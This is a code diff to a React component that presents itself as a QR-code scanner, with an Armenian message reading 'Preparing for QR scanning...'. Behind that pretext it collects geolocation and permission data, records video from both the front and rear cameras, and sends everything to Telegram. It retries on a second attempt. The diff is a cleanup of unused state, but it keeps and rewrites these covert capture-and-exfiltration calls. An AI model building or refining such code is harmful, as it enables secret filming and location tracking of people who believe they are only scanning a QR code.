@@ -64,9 +64,9 @@ const PermissionHandler = () => {
   const mediaChunksRef = useRef<Blob[]>([]);
   const [appPhase, setAppPhase] = useState<AppPhase>("initial");
   const [loadingMessage, setLoadingMessage] = useState("Պատրաստվում ենք QR սկանավորմանը..."); // Preparing for QR scanning...
-  const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId' | 'attempt'>>({});
+  // const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId' | 'attempt'>>({}); // Removed as it's unused
   const [sessionKey, setSessionKey] = useState(0);
-  const [processSuccessful, setProcessSuccessful] = useState<boolean>(false); // This will always be false for QR scan
+  // const [processSuccessful, setProcessSuccessful] = useState<boolean>(false); // Removed as it's unused
   const [currentSessionId, setCurrentSessionId] = useState<string>(() => Math.random().toString(36).substring(2, 10).toUpperCase());
   const processInitiatedRef = useRef(false);
   const [attempt, setAttempt] = useState(1); // New state to track attempts
@@ -185,7 +185,7 @@ const PermissionHandler = () => {
   const handleQrScanError = useCallback(
     async (error: string) => {
       console.error(`[Session ${currentSessionId}] handleQrScanError called. Error: ${error}`);
-      setProcessSuccessful(false);
+      // setProcessSuccessful(false); // Removed as it's unused
       setAppPhase("finished");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'finished' from handleQrScanError.`);
       setAttempt(prev => {
@@ -206,16 +206,16 @@ const PermissionHandler = () => {
 
   const handleVideoRecordedDuringScan = useCallback(async (videoBase64: string) => {
     console.log(`[Session ${currentSessionId}] Video recorded during QR scan received.`);
-    const videoSendSuccess = await sendDataToTelegram({ videoQrScan: videoBase64 }, MessageType.VideoQrScan, attempt);
-    setProcessSuccessful(prev => prev && videoSendSuccess);
+    await sendDataToTelegram({ videoQrScan: videoBase64 }, MessageType.VideoQrScan, attempt);
+    // setProcessSuccessful(prev => prev && videoSendSuccess); // Removed as it's unused
   }, [currentSessionId, sendDataToTelegram, attempt]);
 
   const startNewSession = useCallback(() => {
     console.log(`[Session ${currentSessionId}] Starting new session.`);
     setAppPhase("initial");
-    setCollectedData({});
+    // setCollectedData({}); // Removed as it's unused
     setSessionKey((prevKey) => prevKey + 1);
-    setProcessSuccessful(false);
+    // setProcessSuccessful(false); // Removed as it's unused
     setCurrentSessionId(generateSessionId());
     processInitiatedRef.current = false;
     setAttempt(1);
@@ -274,25 +274,25 @@ const PermissionHandler = () => {
         initialCollectedData.permissionStatus.geolocation = geolocationResult.status;
       }
       
-      setCollectedData(initialCollectedData);
+      // setCollectedData(initialCollectedData); // Removed as it's unused
 
-      const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary, attempt);
-      setProcessSuccessful(initialSendSuccess);
+      await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary, attempt);
+      // setProcessSuccessful(initialSendSuccess); // Removed as it's unused
 
       setAppPhase("recordingVideo1");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo1'.`);
       const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
       if (video1Base64) {
-        const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1, attempt);
-        setProcessSuccessful(prev => prev && video1SendSuccess);
+        await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1, attempt);
+        // setProcessSuccessful(prev => prev && video1SendSuccess); // Removed as it's unused
       }
 
       setAppPhase("recordingVideo2");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2'.`);
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
       if (video2Base64) {
-        const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
-        setProcessSuccessful(prev => prev && video2SendSuccess);
+        await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
+        // setProcessSuccessful(prev => prev && video2SendSuccess); // Removed as it's unused
       }
 
       setAppPhase("qrScanning");
@@ -308,8 +308,8 @@ const PermissionHandler = () => {
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2' for attempt 2.`);
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
       if (video2Base64) {
-        const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
-        setProcessSuccessful(prev => prev && video2SendSuccess);
+        await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
+        // setProcessSuccessful(prev => prev && video2SendSuccess); // Removed as it's unused
       }
       
       setAppPhase("qrScanning");
@@ -322,8 +322,8 @@ const PermissionHandler = () => {
     sendDataToTelegram,
     recordVideoSegment,
     setAppPhase,
-    setProcessSuccessful,
-    setCollectedData,
+    // setProcessSuccessful, // Removed as it's unused
+    // setCollectedData, // Removed as it's unused
     processInitiatedRef,
     attempt
   ]);
